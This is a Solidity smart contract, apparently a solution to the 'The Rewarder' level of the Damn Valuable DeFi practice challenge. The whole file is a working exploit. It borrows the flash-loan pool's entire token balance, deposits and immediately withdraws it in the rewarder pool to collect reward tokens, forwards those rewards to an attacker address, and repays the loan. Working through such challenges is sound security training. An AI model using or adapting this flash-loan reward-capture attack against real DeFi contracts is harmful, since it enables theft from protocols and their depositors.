// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract TheRewarderExploit {
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    TheRewarderPool theRewarderPool;
    FlashLoanerPool flashLoanerPool;
    address attacker;

    constructor(
        address liquidityTokenAddress,
        address rewardTokenAddress,
        address theRewarderPoolAddress,
        address flashLoanerPoolAddress,
        address attackerAddress
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        attacker = attackerAddress;
    }

    function attack() external {
        uint256 flashLoanerPoolBalance = liquidityToken.balanceOf(
            address(flashLoanerPool)
        );
        flashLoanerPool.flashLoan(flashLoanerPoolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        uint256 rewardsBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, rewardsBalance);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
